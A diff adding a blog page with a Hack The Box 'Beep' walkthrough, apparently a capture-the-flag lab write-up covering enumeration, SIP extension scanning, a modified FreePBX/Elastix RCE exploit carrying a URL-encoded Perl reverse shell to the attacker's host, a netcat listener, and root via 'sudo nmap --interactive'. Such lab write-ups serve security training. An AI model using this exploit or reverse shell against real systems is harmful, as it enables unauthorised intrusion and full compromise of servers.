@@ -1,0 +1,331 @@
+I"�p<p>Walkthrough for BEEP - 10.10.10.7</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>first we assign the ip addresses to a local variables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.7
+<span class="nv">ATTACK</span><span class="o">=</span>10.10.14.34
+</code></pre></div></div>
+
+<p>And run a quick nmap scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>This gives me a lot of services:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.7
+Host is up (0.032s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+143/tcp   open  imap
+443/tcp   open  https
+993/tcp   open  imaps
+995/tcp   open  pop3s
+3306/tcp  open  mysql
+4445/tcp  open  upnotifyp
+10000/tcp open  snet-sensor-mgmt
+ 
+Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
+</code></pre></div></div>
+
+<p>Initially this is a difficult guess for the stack as there are so many services.
+While first thoughts are it’s a mail server as we have pop3 (110 and 995) and imap (143 and 993) services there is also a dB service (3306) and potentially a web app to manage it (80 &amp; 443) as well as a couple of services I’m not familiar with (4445 and 10000).</p>
+
+<p>Because there are a lot of services I kick up an aggressive general scan while I begin manual checks:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-A</span>
+</code></pre></div></div>
+
+<p>gives:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.7
+Host is up (0.026s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open  smtp       Postfix smtpd
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+80/tcp    open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.10.10.7/
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_pop3-capabilities: AUTH-RESP-CODE USER UIDL APOP IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING STLS TOP EXPIRE(NEVER) RESP-CODES LOGIN-DELAY(0)
+111/tcp   open  rpcbind    2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            875/udp  status
+|_  100024  1            878/tcp  status
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_imap-capabilities: Completed OK RIGHTS=kxte SORT MULTIAPPEND THREAD=ORDEREDSUBJECT X-NETSCAPE NAMESPACE LIST-SUBSCRIBED LISTEXT ATOMIC IDLE IMAP4rev1 THREAD=REFERENCES ACL ANNOTATEMORE RENAME UIDPLUS CHILDREN QUOTA CONDSTORE URLAUTHA0001 NO BINARY SORT=MODSEQ MAILBOX-REFERRALS ID LITERAL+ UNSELECT IMAP4 CATENATE STARTTLS
+443/tcp   open  ssl/https?
+|_ssl-date: 2018-02-19T21:34:49+00:00; +59m42s from scanner time.
+993/tcp   open  ssl/imap   Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL (unauthorized)
+4445/tcp  open  upnotifyp?
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=11/19%OT=22%CT=1%CU=30552%PV=Y%DS=2%DC=T%G=Y%TM=5DD452
+OS:B3%P=x86_64-pc-linux-gnu)SEQ(SP=C5%GCD=1%ISR=CE%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(
+OS:R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0
+OS:%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
+OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
+OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
+OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+ 
+</code></pre></div></div>
+
+<p>While the above scan was running I decided to perform some manual poking on the website:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>gave a nice redirect:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
+<span class="nt">&lt;html&gt;&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>302 Found<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Found<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>The document has moved <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://10.10.10.7/"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;hr&gt;</span>
+<span class="nt">&lt;address&gt;</span>Apache/2.2.3 (CentOS) Server at 10.10.10.7 Port 80<span class="nt">&lt;/address&gt;</span>
+</code></pre></div></div>
+
+<p>Following the redirect shows us a login page for Elastix.</p>
+
+<p><img src="/assets/htb_stuff/beep/elastix.png" alt="elastix.png" /></p>
+
+<p>I begin to have flashbacks of a previous engagement as I recognise this VOIP PBS system.</p>
+
+<p>Quickly I check searchsploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit Elastix
+</code></pre></div></div>
+
+<p>to get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------------- ----------------------------------------
+Exploit Title                                                               |  Path
+                                                                            | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+Elastix - 'page' Cross-Site Scripting                                        | exploits/php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                      | exploits/php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                | exploits/php/webapps/34942.txt
+Elastix 2.2.0 - 'graph.php' Local File Inclusion                             | exploits/php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                            | exploits/php/webapps/36305.txt
+Elastix &lt; 2.5 - PHP Code Injection                                           | exploits/php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                       | exploits/php/webapps/18650.py
+----------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>Exploit 18650 stands out because it has potential for remote code execution and is in python a preferred language for me.</p>
+
+<p>Time to move to analysis</p>
+
+<h2 id="triage">Triage</h2>
+
+<p>I review the exploit with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span>
+</code></pre></div></div>
+
+<p>It even has a potential path to root via nmap interactive mode:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># sudo nmap --interactive
+</code></pre></div></div>
+
+<p>Because nmap does some funky stuff with UNIX Sockets it needs elevated privs to talk to the kernel to make custom packets. Interactive mode is just that, it lets the user run commands interactively as nmap, which acts as root by default here. This feature while powerful also was responsible for big security gaps. It has since been removed.</p>
+
+<p>Ok but what do we need to do to test the exploit will work?</p>
+
+<p>First point of call is to check the url https://10.10.10.7/recordings/misc/callme_page.php is available, I quickly do a <code class="highlighter-rouge">curl</code> to get a 200 response and see the headers below:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host: 10.10.10.7
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cookie: testing=1; elastixSession=47rgv72o68dlq6mbvi4jd0arn1; ARI=l6g1hmijklp54e6g1988ff90m6
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre></div></div>
+
+<p>Excellent the url is accessible, next I look at the exploit holistically and make the inline changes:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">ssl</span> <span class="c1"># Added this as we are connecting over https
+</span><span class="n">rhost</span><span class="o">=</span><span class="s">"10.10.10.7"</span> <span class="c1"># Changed this
+</span><span class="n">lhost</span><span class="o">=</span><span class="s">"10.10.14.37"</span> <span class="c1"># Changed this
+</span><span class="n">lport</span><span class="o">=</span><span class="mi">443</span>
+<span class="n">extension</span><span class="o">=</span><span class="s">"1000"</span>
+<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span><span class="p">()</span> <span class="c1">#certificate is untrusted, this allows it
+</span> 
+<span class="c1"># Reverse shell payload
+</span> 
+<span class="n">url</span> <span class="o">=</span> <span class="s">'https://'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rhost</span><span class="p">)</span><span class="o">+</span><span class="s">'/recordings/misc/callme_page.php?action=c&amp;callmenum='</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">extension</span><span class="p">)</span><span class="o">+</span><span class="s">'@from-internal/n</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AApplication:</span><span class="si">%20</span><span class="s">system</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AData:</span><span class="si">%20</span><span class="s">perl</span><span class="si">%20</span><span class="s">-MIO</span><span class="si">%20</span><span class="s">-e</span><span class="si">%20%27%24</span><span class="s">p</span><span class="si">%3</span><span class="s">dfork</span><span class="si">%3</span><span class="s">bexit</span><span class="si">%2</span><span class="s">cif</span><span class="si">%28%24</span><span class="s">p</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24</span><span class="s">c</span><span class="si">%3</span><span class="s">dnew</span><span class="si">%20</span><span class="s">IO</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aSocket</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aINET</span><span class="si">%28</span><span class="s">PeerAddr</span><span class="si">%2</span><span class="s">c</span><span class="si">%22</span><span class="s">'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lhost</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%3</span><span class="s">a'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lport</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%22%29%3</span><span class="s">bSTDIN-</span><span class="si">%3</span><span class="s">efdopen</span><span class="si">%28%24</span><span class="s">c</span><span class="si">%2</span><span class="s">cr</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24%7</span><span class="s">e-</span><span class="si">%3</span><span class="s">efdopen</span><span class="si">%28%24</span><span class="s">c</span><span class="si">%2</span><span class="s">cw</span><span class="si">%29%3</span><span class="s">bsystem</span><span class="si">%24%5</span><span class="s">f</span><span class="si">%20</span><span class="s">while</span><span class="si">%3</span><span class="s">c</span><span class="si">%3</span><span class="s">e</span><span class="si">%3</span><span class="s">b</span><span class="si">%27%0</span><span class="s">D</span><span class="si">%0</span><span class="s">A</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">A'</span>
+ 
+<span class="c1">#urllib.urlopen(url)
+</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="n">context</span><span class="p">)</span> <span class="c1">#context added
+</span></code></pre></div></div>
+
+<p>Let’s examine the url variable, in brief it looks like we are dialling an extension number and throwing in a perl reverse shell payload:</p>
+
+<blockquote>
+  <p>https://’+str(<strong>rhost</strong>)+’/recordings/misc/callme_page.php?action=c&amp;callmenum=’+str(<strong>extension</strong>)+’@from-internal/ …. Data:%20 <strong>perl</strong> %20…..+str(<strong>lhost</strong>)+’%3a’+str(<strong>lport</strong>)+’</p>
+</blockquote>
+
+<p>We’re relying on the host having perl (likely as our re-direct said Apache/2.2.3 (CentOS) and perl is usually on Linux), and the extension 1000 being valid.</p>
+
+<p>Testing for perl is not too easy, but if our exploit fails we can always try python or bash.</p>
+
+<p>We can test for the extension though with the SIPVicious suite.</p>
+
+<ul>
+  <li>svmap: an active scanner to identify SIP devices on the network</li>
+  <li>svwar: scans SIP PBX servers for existing extensions</li>
+  <li>svcrack: an online password cracker against SIP PBX servers</li>
+  <li>svreport: manages sessions by the other tools + exports to pdf, xml (html), csv and plain tex</li>
+</ul>
+
+<p>First we need to find if the SIP service is up:</p>
+
+<pre><code class="language-Bash">svmap $TARGET
+</code></pre>
+
+<p>It is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| SIP Device      | User Agent          | Fingerprint |
+-------------------------------------------------------
+| 10.10.10.7:5060 | FPBX-2.8.1(1.8.7.0) | disabled    |
+</code></pre></div></div>
+
+<p>next we scrape the directory for numbers:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svwar <span class="nt">-p</span> 5060 <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>This hits us with an auth error</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ERROR:TakeASip:SIP server replied with an authentication request for an unknown extension. Set --force to force a scan.
+WARNING:root:found nothing
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">--force</code> option will not help us here as we need  username, lets send an INVITE message  and ring the first 1000 phones instead:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svwar <span class="nt">-m</span> INVITE <span class="nt">-p</span> 5060 <span class="nv">$TARGET</span> <span class="nt">-e1-1000</span>
+</code></pre></div></div>
+
+<p>gives me:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+WARNING:TakeASip:extension '955' probably exists but the response is unexpected
+| Extension | Authentication |
+------------------------------
+| 955       | weird          |
+| 233       | reqauth        |
+</code></pre></div></div>
+
+<p>Showing extension 233 is active but requires authorization to use as a phone. This isn’t actually a problem as the <code class="highlighter-rouge">callme_page.php</code> suggests that the web app is sending to this number.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>I edit the exploit to be:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">ssl</span>
+<span class="n">rhost</span><span class="o">=</span><span class="s">"10.10.10.7"</span>
+<span class="n">lhost</span><span class="o">=</span><span class="s">"10.10.14.37"</span>
+<span class="n">lport</span><span class="o">=</span><span class="mi">443</span>
+<span class="n">extension</span><span class="o">=</span><span class="s">"233"</span> <span class="c1">#changed extension
+</span><span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span><span class="p">()</span>
+ 
+<span class="n">url</span> <span class="o">=</span> <span class="s">'https://'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rhost</span><span class="p">)</span><span class="o">+</span><span class="s">'/recordings/misc/callme_page.php?action=c&amp;callmenum='</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">extension</span><span class="p">)</span><span class="o">+</span><span class="s">'@from-internal/n</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AApplication:</span><span class="si">%20</span><span class="s">system</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AData:</span><span class="si">%20</span><span class="s">perl</span><span class="si">%20</span><span class="s">-MIO</span><span class="si">%20</span><span class="s">-e</span><span class="si">%20%27%24</span><span class="s">p</span><span class="si">%3</span><span class="s">dfork</span><span class="si">%3</span><span class="s">bexit</span><span class="si">%2</span><span class="s">cif</span><span class="si">%28%24</span><span class="s">p</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24</span><span class="s">c</span><span class="si">%3</span><span class="s">dnew</span><span class="si">%20</span><span class="s">IO</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aSocket</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aINET</span><span class="si">%28</span><span class="s">PeerAddr</span><span class="si">%2</span><span class="s">c</span><span class="si">%22</span><span class="s">'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lhost</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%3</span><span class="s">a'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lport</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%22%29%3</span><span class="s">bSTDIN-</span><span class="si">%3</span><span class="s">efdopen</span><span class="si">%28%24</span><span class="s">c</span><span class="si">%2</span><span class="s">cr</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24%7</span><span class="s">e-</span><span class="si">%3</span><span class="s">efdopen</span><span class="si">%28%24</span><span class="s">c</span><span class="si">%2</span><span class="s">cw</span><span class="si">%29%3</span><span class="s">bsystem</span><span class="si">%24%5</span><span class="s">f</span><span class="si">%20</span><span class="s">while</span><span class="si">%3</span><span class="s">c</span><span class="si">%3</span><span class="s">e</span><span class="si">%3</span><span class="s">b</span><span class="si">%27%0</span><span class="s">D</span><span class="si">%0</span><span class="s">A</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">A'</span>
+ 
+<span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="n">context</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 443
+</code></pre></div></div>
+
+<p>and run with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 18650.py
+</code></pre></div></div>
+
+<p>This pops a shell in my listener terminal:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 443 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.10.10.7] 36837
+</code></pre></div></div>
+
+<h2 id="priv-escalation">Priv Escalation</h2>
+
+<p>Following the comments in 18650 I run</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">--interactive</span>
+</code></pre></div></div>
+
+<p>to get the following as expected:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt;
+</code></pre></div></div>
+
+<p>then:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>sh
+<span class="nb">id</span>
+</code></pre></div></div>
+
+<p>and I’m root, W00T!W00T!</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>bin<span class="o">)</span>,2<span class="o">(</span>daemon<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="bonus-2019-edit">Bonus (2019 Edit)</h2>
+
+<p>Later versions of Python dropped the default support for weak schannels, TLS 1.0 being included.</p>
+
+<p>Amended code to work in 2019 is a follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">ssl</span>
+ 
+<span class="n">rhost</span><span class="o">=</span><span class="s">"10.10.10.7"</span>
+<span class="n">lhost</span><span class="o">=</span><span class="s">"10.10.14.37"</span>
+<span class="n">lport</span><span class="o">=</span><span class="mi">443</span>
+<span class="n">extension</span><span class="o">=</span><span class="s">"233"</span>
+<span class="c1">#context = ssl._create_unverified_context()
+</span><span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">SSLContext</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">PROTOCOL_TLSv1</span><span class="p">)</span>
+ 
+<span class="c1"># Reverse shell payload
+</span> 
+<span class="n">url</span> <span class="o">=</span> <span class="s">'https://'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rhost</span><span class="p">)</span><span class="o">+</span><span class="s">'/recordings/misc/callme_page.php?action=c&amp;callmenum='</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">extension</span><span class="p">)</span><span class="o">+</span><span class="s">'@from-internal/n</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AApplication:</span><span class="si">%20</span><span class="s">system</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AData:</span><span class="si">%20</span><span class="s">perl</span><span class="si">%20</span><span class="s">-MIO</span><span class="si">%20</span><span class="s">-e</span><span class="si">%20%27%24</span><span class="s">p</span><span class="si">%3</span><span class="s">dfork</span><span class="si">%3</span><span class="s">bexit</span><span class="si">%2</span><span class="s">cif</span><span class="si">%28%24</span><span class="s">p</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24</span><span class="s">c</span><span class="si">%3</span><span class="s">dnew</span><span class="si">%20</span><span class="s">IO</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aSocket</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aINET</span><span class="si">%28</span><span class="s">PeerAddr</span><span class="si">%2</span><span class="s">c</span><span class="si">%22</span><span class="s">'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lhost</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%3</span><span class="s">a'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lport</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%22%29%3</span><span class="s">bSTDIN-</span><span class="si">%3</span><span class="s">efdopen</span><span class="si">%28%24</span><span class="s">c</span><span class="si">%2</span><span class="s">cr</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24%7</span><span class="s">e-</span><span class="si">%3</span><span class="s">efdopen</span><span class="si">%28%24</span><span class="s">c</span><span class="si">%2</span><span class="s">cw</span><span class="si">%29%3</span><span class="s">bsystem</span><span class="si">%24%5</span><span class="s">f</span><span class="si">%20</span><span class="s">while</span><span class="si">%3</span><span class="s">c</span><span class="si">%3</span><span class="s">e</span><span class="si">%3</span><span class="s">b</span><span class="si">%27%0</span><span class="s">D</span><span class="si">%0</span><span class="s">A</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">A'</span>
+ 
+<span class="c1">#urllib.urlopen(url)
+</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="n">context</span><span class="p">)</span>
+</code></pre></div></div>
+:ET
